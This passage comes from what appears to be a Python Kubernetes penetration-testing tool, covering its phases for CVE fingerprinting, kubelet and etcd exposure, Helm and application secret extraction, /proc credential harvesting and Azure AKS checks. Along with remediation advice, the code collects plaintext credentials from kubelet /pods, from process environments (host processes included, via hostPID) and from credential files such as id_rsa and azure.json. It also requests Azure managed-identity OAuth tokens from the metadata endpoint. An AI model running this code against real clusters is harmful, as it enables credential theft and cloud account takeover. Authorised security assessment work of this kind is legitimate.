                info_line("Node IPs obtained via kubectl for public check")
        if not nodes:
            finding("INFO","Cannot check node IPs — node list not accessible","")
            return

    public_nodes  = []
    private_nodes = []

    for node in nodes:
        name       = node.get("name","")
        ip         = node.get("ip","")
        # Also check ExternalIP if present in node info
        ext_ip     = node.get("external_ip","")

        if ip and _is_public_ip(ip):
            public_nodes.append(f"{name}: InternalIP {ip} (PUBLIC)")
        elif ext_ip and _is_public_ip(ext_ip):
            public_nodes.append(f"{name}: ExternalIP {ext_ip} (PUBLIC)")
        elif ip:
            private_nodes.append(f"{name}: {ip} (private)")

    if public_nodes:
        finding("HIGH","Worker nodes have PUBLIC IP addresses",
                "\n".join(public_nodes) + "\n"
                "Public node IPs expose kubelet (10250), NodePort services, "
                "and runtime sockets to the internet",
                "Launch nodes in private subnets only\n"
                "Use NAT Gateway for outbound traffic\n"
                "Remove publicIpAddresses from node group launch template")
        add_attack_edge("Internet","Worker Nodes",
                        "Public node IPs → kubelet 10250 / NodePort exposure","HIGH")
    else:
        if private_nodes:
            finding("PASS","All worker nodes are on private IPs",
                    "\n".join(private_nodes[:6]))
        else:
            finding("INFO","Worker node public IP check — node IPs not available","")

# ══════════════════════════════════════════════════════════════════
# PHASE 15: CLUSTER INTELLIGENCE & CVE DETECTION
# ══════════════════════════════════════════════════════════════════
def phase_cluster_intel():
    global CURRENT_PHASE
    CURRENT_PHASE = "15"
    phase_header("15","Cluster Intelligence & CVE Detection",
                 "K8s version, CVE mapping, node enum, events, leases, CRDs, cluster-wide pod audit")

    section("Kubernetes Version Fingerprinting")
    code, resp = k8s_api("/version")
    if code == 200 and resp:
        git_ver = resp.get("gitVersion","")
        major   = resp.get("major","0")
        minor   = resp.get("minor","0").replace("+","")
        CTX["k8s_version"] = git_ver
        CTX["k8s_major"]   = major
        CTX["k8s_minor"]   = minor
        finding("INFO",f"Kubernetes version: {git_ver}","Checking against known CVEs...")

        k8s_minor = _parse_k8s_minor(git_ver)
        cve_hits = 0
        for cve in K8S_CVES:
            # runc-version-gated CVEs — check containerd version from node info
            if cve.get("runc_check"):
                _check_runc_cve(cve, git_ver)
                continue
            # Always-affected CVEs (design issues, no K8s version fix)
            if cve.get("affected_all"):
                finding(cve["severity"],
                        f"{cve['id']}: {cve['desc']}",
                        f"Affected: {cve['affected']}\nCluster: {git_ver}",
                        f"Apply mitigation for {cve['id']} — no K8s version fix exists")
                cve_hits += 1
                continue
            # Version-gated CVEs — only fire if current minor < fixed_minor
            fixed_minor = cve.get("fixed_minor")
            if fixed_minor is not None and k8s_minor < fixed_minor:
                finding(cve["severity"],
                        f"{cve['id']}: {cve['desc']}",
                        f"Affected: {cve['affected']}\nCluster: {git_ver} (minor={k8s_minor}, fixed in minor={fixed_minor})",
                        f"Upgrade Kubernetes — {cve['id']} fixed in minor version {fixed_minor}+")
                cve_hits += 1
            # else: current version is >= fixed version, skip silently
        if cve_hits == 0:
            finding("PASS",f"No known K8s CVEs apply to {git_ver}",
                    f"All version-specific CVEs in database are fixed in minor >= {k8s_minor}")
    else:
        finding("INFO",f"Cannot read /version (HTTP {code})","")

    section("Kernel Version & Exploit Detection")
    _, uname_r, _ = run_cmd("uname -r")
    _, uname_s, _ = run_cmd("uname -s")
    if uname_r:
        is_linux = uname_s.strip().lower() == "linux"
        finding("INFO",f"Kernel version: {uname_r}",
                f"OS: {uname_s.strip()} | Linux CVE checks: {'enabled' if is_linux else 'skipped (non-Linux)'}")
        if is_linux:
            running_ver = _parse_kernel_ver(uname_r)
            is_ubuntu   = "ubuntu" in uname_r.lower() or "generic" in uname_r.lower()
            kve_hits    = 0
            for kve in KERNEL_CVES:
                # Ubuntu-only CVEs — skip on non-Ubuntu kernels
                if kve.get("ubuntu_only") and not is_ubuntu:
                    continue
                kve_min = kve.get("min",(0,0,0))
                kve_max = kve.get("max",(0,0,0))
                if _kernel_ver_in_range(running_ver, kve_min, kve_max):
                    finding(kve["severity"],
                            f"{kve['id']}: {kve['desc']}",
                            f"Affected: {kve['affected']}\nRunning: {uname_r} → parsed {running_ver}\n"
                            f"This kernel IS in the affected range",
                            f"Upgrade kernel immediately | Review {kve['id']}")
                    kve_hits += 1
            if kve_hits == 0:
                finding("PASS",f"No kernel CVEs apply to {uname_r}",
                        f"Parsed version {running_ver} — above all affected ranges in database")
        else:
            finding("INFO","Non-Linux OS detected — kernel CVE checks skipped",
                    "Darwin/macOS kernel version numbers are unrelated to Linux CVE ranges")

    section("Node Enumeration")
    if CTX.get("nodes"):
        node_ips = [n["ip"] for n in CTX["nodes"] if n.get("ip")]
        CTX["node_ips"] = node_ips
        info_line(f"Node IPs from API: {', '.join(node_ips[:6])}")
        for n in CTX["nodes"]:
            rt = n.get("runtime","")
            if "runc" in rt.lower():
                finding("HIGH",f"Node {n['name']} uses runc — verify CVE-2024-21626",
                        f"Runtime: {rt}\nLeaky Vessels: runc < 1.1.12 → /proc/self/fd container escape",
                        "Upgrade container runtime to latest version")
    else:
        # API returned 403 — use kubectl and host filesystem fallbacks
        info_line("Node list not available via SA token — trying kubectl + host filesystem...")
        node_ips = _get_node_ips()
        if node_ips and node_ips != ["127.0.0.1"]:
            finding("INFO",f"Node IPs discovered via fallback: {len(node_ips)}",
                    f"IPs: {', '.join(node_ips)}\n"
                    "Source: kubectl get nodes / kubelet config / /proc/net/fib_trie / hostname -I")

    section("API Server Public Exposure")
    _check_api_server_public()

    section("Worker Node Public IP Check")
    _check_node_public_ips()

    section("Kubernetes Event Intelligence")
    code_ev, resp_ev = k8s_api("/api/v1/events")
    if code_ev == 200 and resp_ev:
        events = resp_ev.get("items",[])
        findings_in_events = []
        for ev in events:
            msg = ev.get("message","")
            if any(kw in msg.lower() for kw in ["password","secret","token","credential","failed to mount","failed mount"]):
                findings_in_events.append(msg)
        if findings_in_events:
            finding("HIGH","Event logs leak sensitive information cluster-wide",
                    "\n".join([truncate(m,120) for m in findings_in_events[:5]]),
                    "Sanitize application messages | Restrict event read permissions")
        else:
            finding("INFO",f"Cluster-wide events readable ({len(events)} events)",
                    "No immediate credential leakage detected")
    else:
        finding("PASS","Cannot read cluster-wide events",f"HTTP {code_ev}")

    section("Lease Object Enumeration")
    code_l, resp_l = k8s_api("/apis/coordination.k8s.io/v1/leases")
    if code_l == 200 and resp_l:
        leases = resp_l.get("items",[])
        controllers = [l["metadata"]["name"] for l in leases if "kube" in l["metadata"]["name"].lower()]
        finding("INFO",f"Lease objects readable ({len(leases)} total)",
                f"Controllers: {', '.join(controllers[:6])}\n"
                "Reveals leader election holders, node names, controller identities",
                "Restrict coordination.k8s.io/leases list permission")

    section("CRD Enumeration")
    code_crd, resp_crd = k8s_api("/apis/apiextensions.k8s.io/v1/customresourcedefinitions")
    if code_crd == 200 and resp_crd:
        crds = resp_crd.get("items",[])
        sensitive_crds = [c["metadata"]["name"] for c in crds
                          if any(kw in c["metadata"]["name"].lower()
                                 for kw in ["argocd","vault","gitops","crossplane","external-secrets","sealed"])]
        finding("INFO",f"CRDs enumerated: {len(crds)} total",
                f"Sensitive CRDs: {', '.join(sensitive_crds[:6]) if sensitive_crds else 'none'}\n"
                "ArgoCD/Vault CRDs often contain credentials in CR objects",
                "Restrict CRD list | Audit CR objects for embedded secrets")
        # Deep ArgoCD enumeration when detected via CRDs
        argocd_detected = any("argocd" in n for n in sensitive_crds)
        if argocd_detected:
            CTX["argocd_detected"] = True
            _enumerate_argocd()

    # ArgoCD fallback trigger — fires if /proc scanning found argocd processes
    # (handles case where CRD list is 403 but argocd processes visible in same pod)
    if CTX.get("argocd_detected") and not any(
            "ArgoCD" in f["check"] for f in FINDINGS):
        info_line("ArgoCD detected via process scan — running deep enumeration...")
        _enumerate_argocd()

    section("Cluster-Wide Privileged Pod Audit")
    all_pods = CTX.get("all_pods",[])
    if not all_pods:
        code_p, resp_p = k8s_api("/api/v1/pods")
        if code_p == 200 and resp_p:
            all_pods = resp_p.get("items",[])
    priv_pods = []
    for pod in all_pods:
        spec = pod.get("spec",{})
        meta = pod.get("metadata",{})
        issues = []
        if spec.get("hostPID"):    issues.append("hostPID")
        if spec.get("hostNetwork"): issues.append("hostNetwork")
        if spec.get("hostIPC"):    issues.append("hostIPC")
        for c in spec.get("containers",[]):
            sc = c.get("securityContext",{})
            if sc.get("privileged"):           issues.append(f"privileged({c['name']})")
            if sc.get("runAsUser") == 0:       issues.append(f"runAsRoot({c['name']})")
            if sc.get("allowPrivilegeEscalation"): issues.append(f"privEsc({c['name']})")
        if issues:
            priv_pods.append(f"{meta.get('namespace','')}/{meta.get('name','')} [{', '.join(issues)}]")
    if priv_pods:
        finding("HIGH",f"Privileged/over-permissioned pods running cluster-wide: {len(priv_pods)}",
                "\n".join(priv_pods[:8]),
                "Apply PSS Restricted | Audit security contexts | Remove unnecessary privileges")
    elif all_pods:
        finding("PASS","No obviously privileged pods found cluster-wide","")


def _get_node_ips():
    """
    Get node IPs via every available method, in priority order.
    Used by phase_kubelet and phase_etcd when /api/v1/nodes returns 403.
    """
    ips = list(CTX.get("node_ips", []))
    if ips:
        return ips

    # Method 1: kubectl get nodes — uses kubeconfig, different auth from SA token
    if CTX.get("kubectl"):
        _, out, _ = run_cmd(
            "kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==InternalIP)].address}'",
            timeout=10)
        if out:
            for ip in out.strip().strip("'").split():
                if ip and ip not in ips:
                    ips.append(ip)
            if ips:
                info_line(f"Node IPs via kubectl: {', '.join(ips)}")
                CTX["node_ips"] = ips
                return ips

    # Method 2: kubelet config on host filesystem contains API server/node IP
    for cfg_path in ["/host/var/lib/kubelet/config.yaml",
                     "/host/var/lib/kubelet/kubeconfig",
                     "/host/etc/kubernetes/kubelet.conf"]:
        content = file_read(cfg_path) or ""
        if content:
            m = re.search(r'server:\s*https?://([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', content)
            if m and m.group(1) not in ips:
                ips.append(m.group(1))
                info_line(f"Node IP from kubelet config ({cfg_path}): {m.group(1)}")

    # Method 3: hostname -I — with hostNetwork: true this gives node IPs directly
    _, hout, _ = run_cmd("hostname -I", timeout=3)
    if hout:
        for ip in hout.strip().split():
            if (ip and not ip.startswith("127.") and
                    not ip.startswith("169.254.") and
                    not ip.startswith("::") and ip not in ips):
                ips.append(ip)
                info_line(f"Node IP from hostname -I: {ip}")

    # Method 4: /proc/net/fib_trie — parse primary non-loopback/non-pod IP
    for fib_path in ["/host/proc/net/fib_trie", "/proc/net/fib_trie"]:
        fib = file_read(fib_path) or ""
        if fib:
            # Find LOCAL scope entries — these are IPs assigned to this machine
            local_ips = re.findall(
                r'(\d+\.\d+\.\d+\.\d+)\n.*?LOCAL', fib)
            for ip in local_ips:
                if (not ip.startswith("127.") and
                        not ip.startswith("169.254.") and
                        not ip.endswith(".0") and
                        not ip.endswith(".255") and
                        ip not in ips):
                    ips.append(ip)
                    info_line(f"Node IP from fib_trie: {ip}")
                    break  # first valid one is the primary node IP
            if ips: break

    # Method 5: Downward API nodeName → DNS resolve
    for dp in ["/etc/podinfo", "/etc/pod-info", "/etc/pod_info"]:
        node_name = (file_read(f"{dp}/nodeName") or "").strip()
        if node_name:
            resolved = dns_resolve(node_name)
            if resolved and resolved not in ips:
                ips.append(resolved)
                info_line(f"Node IP via Downward API DNS: {node_name} → {resolved}")

    # Fallback: localhost (hostNetwork pods can sometimes reach kubelet on 127.0.0.1)
    if not ips:
        ips = ["127.0.0.1"]

    CTX["node_ips"] = ips
    return ips

# ══════════════════════════════════════════════════════════════════
# PHASE 16: KUBELET EXPLOITATION
# ══════════════════════════════════════════════════════════════════
def phase_kubelet():
    global CURRENT_PHASE
    CURRENT_PHASE = "16"
    phase_header("16","Kubelet Exploitation",
                 "Anonymous access, /pods credential harvest, exec endpoint, weak TLS")

    node_ips = _get_node_ips()
    info_line(f"Probing kubelet on: {', '.join(node_ips[:5])}")

    for node_ip in node_ips[:5]:
        section(f"Kubelet @ {node_ip}")

        # Port 10255 — read-only, no auth required on old clusters
        if tcp_open(node_ip, 10255, 2):
            code, body = http_get(f"http://{node_ip}:10255/pods", timeout=5)
            if code == 200:
                finding("CRITICAL",f"Kubelet port 10255 OPEN with NO AUTH at {node_ip}",
                        "Anonymous read access to pod metadata, env vars, mounted secrets",
                        "Disable --read-only-port=0 on kubelet | Apply firewall rules")
                add_attack_edge("Network Access","All Pod Credentials",
                                f"Kubelet 10255 anonymous → /pods harvest","CRITICAL")
                # Harvest credentials
                try:
                    pods_data = json.loads(body)
                    _harvest_kubelet_pods(pods_data, node_ip, 10255)
                except: pass
            else:
                finding("INFO",f"Port 10255 open at {node_ip} but /pods returned HTTP {code}","")
        else:
            finding("PASS",f"Kubelet port 10255 not reachable at {node_ip}","")

        # Port 10250 — authenticated
        if tcp_open(node_ip, 10250, 2):
            # Try anonymous access first
            code_anon, body_anon = http_get(f"https://{node_ip}:10250/pods", timeout=5)
            if code_anon == 200:
                finding("CRITICAL",f"Kubelet 10250 accessible ANONYMOUSLY at {node_ip}",
                        "Full pod list, exec capability without credentials",
                        "Set --anonymous-auth=false on kubelet | Apply RBAC --authorization-mode=Webhook")
                add_attack_edge("Network Access","Node RCE",
                                f"Kubelet 10250 anonymous exec → {node_ip}","CRITICAL")
                try:
                    pods_data = json.loads(body_anon)
                    _harvest_kubelet_pods(pods_data, node_ip, 10250)
                except: pass
            elif code_anon == 401:
                finding("PASS",f"Kubelet 10250 requires auth at {node_ip}","Auth enforced (401)")
            else:
                finding("INFO",f"Kubelet 10250 at {node_ip}: HTTP {code_anon}","")

            # Try /runningpods
            code_rp, _ = http_get(f"https://{node_ip}:10250/runningpods/", timeout=3)
            if code_rp == 200:
                finding("HIGH",f"Kubelet /runningpods accessible at {node_ip}",
                        "Lists all running pods with container IDs and spec",
                        "Restrict kubelet API access | Enable webhook authorization")
        else:
            finding("INFO",f"Kubelet 10250 not reachable at {node_ip}","Not in hostNetwork or filtered")

def _harvest_kubelet_pods(pods_data, node_ip, port):
    """Parse kubelet /pods response for credentials."""
    items = pods_data.get("items",[]) if isinstance(pods_data, dict) else []
    creds_found = []
    cred_kw = ["password","passwd","secret","token","key","credential","api_key"]
    for pod in items[:20]:
        for c in pod.get("spec",{}).get("containers",[]):
            for env in c.get("env",[]):
                if any(kw in env.get("name","").lower() for kw in cred_kw):
                    val = env.get("value","") or str(env.get("valueFrom",""))
                    creds_found.append(f"{pod['metadata']['name']}/{c['name']}: "
                                       f"{env['name']}={val[:60]}")
    if creds_found:
        finding("CRITICAL",f"Credentials harvested from kubelet /pods at {node_ip}:{port}",
                "\n".join(creds_found[:8]),
                "Disable anonymous kubelet | Remove plain-text env var credentials")
        add_attack_edge(f"Kubelet {node_ip}","Cluster Credentials",
                        "Env var harvest from /pods endpoint","CRITICAL")

# ══════════════════════════════════════════════════════════════════
# PHASE 17: ETCD EXPOSURE
# ══════════════════════════════════════════════════════════════════
def phase_etcd():
    global CURRENT_PHASE
    CURRENT_PHASE = "17"
    phase_header("17","etcd Exposure",
                 "Unauthenticated etcd access, secret dump, TLS bypass")

    node_ips = _get_node_ips()
    info_line(f"Probing etcd on: {', '.join(node_ips[:5])}")

    for node_ip in node_ips[:5]:
        section(f"etcd @ {node_ip}")

        if not tcp_open(node_ip, 2379, 2):
            finding("PASS",f"etcd port 2379 not reachable at {node_ip}","Filtered or not exposed")
            continue

        # HTTP (no TLS)
        code, body = http_get(f"http://{node_ip}:2379/version", timeout=4)
        if code == 200:
            finding("CRITICAL",f"etcd at {node_ip}:2379 accessible WITHOUT TLS",
                    f"Version info: {truncate(body,120)}\n"
                    "Entire Kubernetes state — all secrets — readable without credentials",
                    "Enable --client-cert-auth=true on etcd | Restrict port 2379 to API server only")
            add_attack_edge("Network Access","All Cluster Secrets",
                            f"etcd {node_ip}:2379 no-auth → /registry/secrets dump","CRITICAL")

            # Try listing secrets
            code2, body2 = http_get(f"http://{node_ip}:2379/v3/keys/registry/secrets", timeout=4)
            if code2 == 200:
                finding("CRITICAL",f"etcd v3 keys accessible — full cluster secret dump possible",
                        f"Endpoint: http://{node_ip}:2379/v3/keys/registry/secrets\n"
                        "Use etcdctl to extract all Kubernetes secrets",
                        "Immediately restrict etcd access to API server only")
            continue

        # HTTPS (TLS, no client cert)
        code_tls, body_tls = http_get(f"https://{node_ip}:2379/version", timeout=4)
        if code_tls == 200:
            finding("CRITICAL",f"etcd at {node_ip}:2379 accessible via HTTPS without client cert",
                    f"TLS present but no mutual TLS enforced\n{truncate(body_tls,120)}",
                    "Enable --client-cert-auth=true | Require etcd client certificates")
            add_attack_edge("Network Access","All Cluster Secrets",
                            f"etcd {node_ip}:2379 TLS no client cert","CRITICAL")
        else:
            finding("PASS",f"etcd at {node_ip}:2379 properly protected",f"HTTP {code_tls}")

        # Port 2380 (peer)
        if tcp_open(node_ip, 2380, 2):
            code_peer, _ = http_get(f"http://{node_ip}:2380/version", timeout=3)
            if code_peer == 200:
                finding("HIGH",f"etcd peer port 2380 open and accessible at {node_ip}",
                        "Peer port should be internal only",
                        "Restrict etcd peer port 2380 to etcd cluster members only")

# ══════════════════════════════════════════════════════════════════
# PHASE 18: HELM & APP SECRET EXTRACTION
# ══════════════════════════════════════════════════════════════════
def phase_helm():
    global CURRENT_PHASE
    CURRENT_PHASE = "18"
    phase_header("18","Helm & Application Secret Extraction",
                 "Helm release secrets, imagePullSecrets, application credential files")

    section("Helm Release Secrets")
    code, resp = k8s_api("/api/v1/secrets")
    if code == 200 and resp:
        helm_secrets = [i for i in resp.get("items",[])
                        if i.get("type","") == "helm.sh/release.v1"]
        if helm_secrets:
            finding("HIGH",f"Found {len(helm_secrets)} Helm release secret(s)",
                    f"Releases: {', '.join([s['metadata']['name'] for s in helm_secrets[:6]])}",
                    "Restrict secret read permissions | Use Helm secrets plugin with encryption")
            for hs in helm_secrets[:3]:
                data = hs.get("data",{})
                raw_b64 = data.get("release","")
                if raw_b64:
                    try:
                        raw  = decode_b64(raw_b64)
                        # Helm releases are base64(gzip(json))
                        try:
                            raw2 = base64.b64decode(raw)
                            decompressed = gzip.decompress(raw2).decode(errors="replace")
                        except:
                            decompressed = raw
                        # Search for credentials in decompressed content
                        cred_pattern = re.compile(
                            r'(?:password|secret|apikey|token|credential)\s*[:=]\s*["\']?([^\s"\'<>{}]{6,})',
                            re.IGNORECASE)
                        matches = cred_pattern.findall(decompressed)
                        if matches:
                            finding("CRITICAL",f"Credentials in Helm release: {hs['metadata']['name']}",
                                    f"Found: {', '.join([m[:50] for m in matches[:4]])}",
                                    "Rotate exposed credentials | Use external-secrets operator")
                    except Exception as e:
                        finding("INFO",f"Helm release {hs['metadata']['name']} — parse error: {str(e)[:60]}","")
        else:
            finding("PASS","No Helm release secrets found or accessible","")

    section("Cluster-Wide imagePullSecrets")
    registry_creds = set()
    for pod in (CTX.get("all_pods") or []):
        for ips in pod.get("spec",{}).get("imagePullSecrets",[]):
            sname = ips.get("name","")
            pns   = pod["metadata"]["namespace"]
            if sname:
                code_s, resp_s = k8s_api(f"/api/v1/namespaces/{pns}/secrets/{sname}")
                if code_s == 200 and resp_s:
                    cfg = resp_s.get("data",{}).get(".dockerconfigjson","")
                    if cfg:
                        try:
                            parsed = json.loads(decode_b64(cfg))
                            for registry in parsed.get("auths",{}).keys():
                                registry_creds.add(f"{pns}/{sname} → {registry}")
                        except: pass
    if registry_creds:
        finding("HIGH",f"Registry credentials from imagePullSecrets: {len(registry_creds)}",
                "\n".join(list(registry_creds)[:6]),
                "Restrict secret read | Rotate registry credentials")

    section("Application Secret File Scanning")
    cred_pattern = re.compile(
        r'(?:password|passwd|secret|api_key|token|credential)\s*[:=]\s*["\']?([^\s"\'<>]{6,})',
        re.IGNORECASE)
    scan_dirs = ["/app","/config","/etc/app","/srv","/opt","/home"]
    cred_files = []
    # Also look for known credential files
    known_files = [".env","credentials.json","id_rsa","id_ed25519",".netrc",
                   "secrets.yaml","secrets.yml","vault-token","token"]
    for d in scan_dirs:
        if not os.path.isdir(d): continue
        try:
            for root, _, files in os.walk(d):
                for fname in files:
                    fpath = os.path.join(root, fname)
                    if fname in known_files:
                        content = (file_read(fpath, lines=3) or "")[:200]
                        if content:
                            cred_files.append((fpath, truncate(content,100)))
                    elif any(fname.endswith(ext) for ext in [".env",".conf",".yaml",".yml",".json"]):
                        content = file_read(fpath) or ""
                        matches = cred_pattern.findall(content)
                        if matches:
                            cred_files.append((fpath, f"Matches: {', '.join([m[:40] for m in matches[:3]])}"))
        except: pass
    if cred_files:
        finding("HIGH",f"Credential files found: {len(cred_files)}",
                "\n".join([f"{p}: {v}" for p,v in cred_files[:6]]),
                "Move to Kubernetes Secrets | Remove credential files from images")
    else:
        finding("PASS","No credential files found in application directories","")

# ══════════════════════════════════════════════════════════════════
# PHASE 19: /proc CREDENTIAL HARVESTING
# ══════════════════════════════════════════════════════════════════
def phase_proc_harvest():
    global CURRENT_PHASE
    CURRENT_PHASE = "19"
    phase_header("19","/proc Credential Harvesting",
                 "Process env harvesting, Downward API abuse, hostPID process scanning")

    cred_kw = ["password","passwd","secret","token","api_key","apikey","database_url",
               "db_pass","redis_pass","mongo_pass","private_key","access_key","auth_key"]
    skip_kw = ["kubernetes","service_port","service_host","_path","_home","shell","term","lang"]

    section("/proc/self/environ (Current Process)")
    self_env = file_read("/proc/self/environ")
    if self_env:
        env_vars = self_env.split("\x00")
        creds = []
        for ev in env_vars:
            if "=" in ev:
                k, _, v = ev.partition("=")
                kl = k.lower()
                if (any(kw in kl for kw in cred_kw) and
                    not any(sk in kl for sk in skip_kw)):
                    creds.append(f"{k}={v[:60]}")
        if creds:
            finding("HIGH","Credentials in current process /proc/self/environ",
                    "\n".join(creds[:8]),
                    "Do not pass credentials as env vars | Use mounted secret files")
        else:
            finding("PASS","No credentials in current process environ","")

    section("/proc/*/environ — Other Processes in Same Pod")
    all_creds  = []
    # Collect PIDs that belong to THIS pod's process tree — skip in hostPID scan
    pod_pids   = set()
    pod_pids.add(str(os.getpid()))
    try:
        # Walk our own cgroup to find all sibling PIDs
        our_cgroup = file_read("/proc/self/cgroup") or ""
        for pid in os.listdir("/proc"):
            if not pid.isdigit(): continue
            if pid == str(os.getpid()): continue
            env_data = file_read(f"/proc/{pid}/environ")
            if not env_data: continue
            comm = (file_read(f"/proc/{pid}/comm") or "").strip()
            # Check if this PID shares our cgroup (same pod)
            pid_cgroup = file_read(f"/proc/{pid}/cgroup") or ""
            # Compare last cgroup segment (most specific namespace)
            our_last  = our_cgroup.split("\n")[0].split("/")[-1] if our_cgroup else ""
            pid_last  = pid_cgroup.split("\n")[0].split("/")[-1] if pid_cgroup else ""
            same_pod  = (our_last and pid_last and our_last == pid_last)
            if same_pod:
                pod_pids.add(pid)
            for ev in env_data.split("\x00"):
                if "=" in ev:
                    k, _, v = ev.partition("=")
                    kl = k.lower()
                    if (any(kw in kl for kw in cred_kw) and
                            not any(sk in kl for sk in skip_kw) and v):
                        all_creds.append(f"PID {pid} ({comm}): {k}={v[:60]}")
                        if "redis" in kl and "pass" in kl:
                            CTX["argocd_redis_pass"] = v.strip()
                        if kl in ("argocd_token","argocd_auth_token") and v.startswith("ey"):
                            CTX["argocd_token"] = v.strip()
                        # Detect ArgoCD running in same pod
                        if "argocd" in comm.lower() or "argocd" in kl:
                            CTX["argocd_detected"] = True
    except: pass

    if all_creds:
        finding("HIGH","Credentials harvested from other processes in same pod",
                "\n".join(all_creds[:8]),
                "Remove env var credentials | Use mounted secrets at file level")
        add_attack_edge("Compromised Pod","Co-located Secrets",
                        "/proc/*/environ → credential harvest from sibling processes","HIGH")
    else:
        finding("PASS","No credentials found in co-process /proc environ",
                "Either no co-processes or they use no plain-text credentials")

    section("hostPID — Host Process Scanning")
    pid1 = (file_read("/proc/1/comm") or "").strip()
    if pid1 in ("systemd","init","bash","sh"):
        host_creds = []
        interesting_procs = []
        # Only host-level processes — skip PIDs that belong to this pod
        host_interesting_kw = ["kube","etcd","docker","containerd","vault",
                               "consul","postgres","mysql"]
        try:
            for pid in os.listdir("/proc"):
                if not pid.isdigit(): continue
                if pid in pod_pids: continue   # skip own pod's processes
                comm = (file_read(f"/proc/{pid}/comm") or "").strip()
                cmdline = (file_read(f"/proc/{pid}/cmdline") or "").replace("\x00"," ").strip()
                if any(kw in comm.lower() or kw in cmdline.lower()
                       for kw in host_interesting_kw):
                    interesting_procs.append(f"{pid}:{comm}")
                    env_data = file_read(f"/proc/{pid}/environ") or ""
                    for ev in env_data.split("\x00"):
                        if "=" in ev:
                            k, _, v = ev.partition("=")
                            kl = k.lower()
                            if (any(kw in kl for kw in cred_kw) and
                                    not any(sk in kl for sk in skip_kw) and v):
                                host_creds.append(f"PID {pid} ({comm}): {k}={v[:60]}")
                                if "redis" in kl and "pass" in kl:
                                    CTX["argocd_redis_pass"] = v.strip()
        except: pass
        if host_creds:
            finding("CRITICAL","Credentials harvested from HOST processes via hostPID",
                    "\n".join(host_creds[:8]),
                    "Remove hostPID: true | Never run privileged pods")
            add_attack_edge("hostPID Access","Node Credentials",
                            "Host process /proc/*/environ → kubelet/etcd creds","CRITICAL")
        else:
            finding("PASS","No credentials in host-level processes",
                    "Host processes (kubelet, containerd, etcd) have no plain-text credentials in environ")
        if interesting_procs:
            finding("HIGH","Sensitive host processes visible via hostPID",
                    f"Processes: {chr(44).join(interesting_procs[:8])}",
                    "Remove hostPID: true from pod spec")
    else:
        finding("PASS","hostPID not enabled — only pod processes visible","")

    # Trigger ArgoCD enumeration now that we have redis password and process info
    if CTX.get("argocd_detected") or CTX.get("argocd_redis_pass"):
        if not any("ArgoCD Deep" in f.get("check","") or
                   "ArgoCD repository" in f.get("check","") or
                   "ArgoCD Applications" in f.get("check","")
                   for f in FINDINGS):
            info_line("ArgoCD detected via /proc — pivoting with stolen credentials...")
            _enumerate_argocd()

    section("Downward API Abuse")
    downward_paths = ["/etc/podinfo","/etc/pod-info","/etc/pod_info"]
    for dp in downward_paths:
        if os.path.isdir(dp):
            try:
                files = os.listdir(dp)
                content = {}
                for f in files:
                    content[f] = (file_read(os.path.join(dp, f)) or "").strip()
                finding("INFO","Downward API volume mounted",
                        f"Path: {dp}\nFiles: {', '.join(files)}\n"
                        f"Content: {json.dumps(content, indent=2)[:300]}\n"
                        "Node name revealed → target kubelet API on specific node",
                        "Limit Downward API to only required fields")
                if "nodeName" in str(content) or "spec.nodeName" in str(content):
                    node_name = content.get("nodeName","") or content.get("spec.nodeName","")
                    if node_name:
                        info_line(f"Node name from Downward API: {node_name} — adding to kubelet targets")
                        if node_name not in CTX.get("node_ips",[]):
                            resolved = dns_resolve(node_name)
                            if resolved:
                                ips = CTX.get("node_ips",[])
                                ips.append(resolved)
                                CTX["node_ips"] = ips
            except: pass

# ══════════════════════════════════════════════════════════════════
# PHASE 20: AZURE AKS
# ══════════════════════════════════════════════════════════════════
def phase_azure():
    global CURRENT_PHASE
    CURRENT_PHASE = "20"
    phase_header("20","Azure AKS-Specific Tests",
                 "IMDS, Managed Identity, Workload Identity, azure.json, AAD Pod Identity")

    if CTX.get("cloud") != "Azure":
        finding("INFO","Not Azure — AKS checks skipped",f"Detected: {CTX.get('cloud','Unknown')}")
        return

    section("Azure IMDS Instance Info")
    code, body = http_get(
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        headers={"Metadata":"true"}, timeout=3)
    if code == 200:
        try:
            meta = json.loads(body)
            comp = meta.get("compute",{})
            finding("INFO","Azure IMDS accessible",
                    f"VM: {comp.get('name','')} | ResourceGroup: {comp.get('resourceGroupName','')}\n"
                    f"Location: {comp.get('location','')} | SubID: {comp.get('subscriptionId','')[:8]}...",
                    "Block IMDS from pods via NetworkPolicy egress deny 169.254.169.254/32")
            CTX["azure_sub"] = comp.get("subscriptionId","")
            CTX["azure_rg"]  = comp.get("resourceGroupName","")
        except:
            finding("HIGH","Azure IMDS accessible but parse failed",truncate(body,200))

    section("Managed Identity Token Theft")
    mi_resources = [
        "https://management.azure.com/",
        "https://storage.azure.com/",
        "https://graph.microsoft.com/",
        "https://vault.azure.net/",
    ]
    for resource in mi_resources:
        encoded = urllib.parse.quote(resource, safe="")
        code, body = http_get(
            f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={encoded}",
            headers={"Metadata":"true"}, timeout=3)
        if code == 200:
            try:
                tok_data = json.loads(body)
                finding("CRITICAL",f"Managed Identity OAuth2 token for {resource}",
                        f"Token type: {tok_data.get('token_type')} | "
                        f"Expires: {tok_data.get('expires_in')}s\n"
                        f"Token preview: {tok_data.get('access_token','')[:20]}...",
                        "Restrict IMDS | Use Workload Identity Federation instead of Managed Identity")
                add_attack_edge("Compromised Pod","Azure Account",
                                f"Managed Identity → {resource}","CRITICAL")
            except: pass
        elif code == 400:
            finding("MEDIUM","Managed Identity endpoint reachable but no identity assigned","",
                    "Still block IMDS access as defense-in-depth")

    section("Azure Workload Identity")
    az_client  = os.environ.get("AZURE_CLIENT_ID","")
    az_tenant  = os.environ.get("AZURE_TENANT_ID","")
    az_tok_file = os.environ.get("AZURE_FEDERATED_TOKEN_FILE","")
    if az_client and az_tenant:
        tok_content = file_read(az_tok_file) if az_tok_file else ""
        finding("HIGH","Azure Workload Identity configured on this pod",
                f"Client ID: {az_client}\nTenant: {az_tenant}\nToken file: {az_tok_file}\n"
                "Can exchange K8s SA token for Azure AD token",
                "Scope AKS Workload Identity to minimum required Azure permissions")
        add_attack_edge("Compromised Pod","Azure AD","Workload Identity token exchange","HIGH")
    else:
        finding("PASS","No Azure Workload Identity env vars","")

    section("azure.json Service Principal Credentials")
    for az_path in ["/etc/kubernetes/azure.json","/etc/kubernetes/cloud.conf"]:
        content = file_read(az_path)
        if content:
            try:
                az_cfg = json.loads(content)
